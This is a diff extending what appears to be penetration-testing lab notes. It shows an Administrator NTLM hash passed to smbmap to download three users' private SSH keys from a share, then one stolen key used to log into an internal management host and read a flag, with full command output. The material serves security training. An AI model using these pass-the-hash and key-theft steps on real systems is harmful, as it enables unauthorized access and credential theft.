@@ -2813,3 +2813,69 @@ smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea7
         SYSVOL                                                  READ, WRITE     Logon server share 
 [-] Closing connections..                                                                           
 ```
+
+```bash
+smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2' -H 172.16.8.3 --download "Department Shares//IT/Private/Networking/harry-id_rsa"
+```
+
+```bash
+smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2' -H 172.16.8.3 --download "Department Shares//IT/Private/Networking/james-id_rsa"
+```
+
+```bash
+smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2' -H 172.16.8.3 --download "Department Shares//IT/Private/Networking/ssmallsadm-id_rsa"
+```
+
+ssh access
+
+```
+chmod 600 ssmallsadm-id_rsa
+                                                                                                                
+┌──(kali㉿kali)-[~/labs/aen]
+└─$ ssh ssmallsadm@172.16.9.25 -i ssmallsad-id_rsa
+Warning: Identity file ssmallsad-id_rsa not accessible: No such file or directory.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+ssmallsadm@172.16.9.25's password: 
+
+                                                                                                                
+┌──(kali㉿kali)-[~/labs/aen]
+└─$ ssh ssmallsadm@172.16.9.25 -i ssmallsadm-id_rsa
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.10.0-051000-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun 15 Nov 2026 07:14:20 PM UTC
+
+  System load:  0.0                Processes:               229
+  Usage of /:   27.4% of 13.72GB   Users logged in:         0
+  Memory usage: 11%                IPv4 address for ens160: 172.16.9.25
+  Swap usage:   0%
+
+
+159 updates can be applied immediately.
+103 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+Last login: Mon May 23 08:48:13 2022 from 172.16.0.1
+ssmallsadm@MGMT01:~$ ls
+flag.txt
+ssmallsadm@MGMT01:~$ cat flag.txt
+3c4996521690cc76446894da2bf7dd8fssmallsadm@MGMT01:~$ id
+uid=1001(ssmallsadm) gid=1001(ssmallsadm) groups=1001(ssmallsadm)
+ssmallsadm@MGMT01:~$ ls -la
+
+```
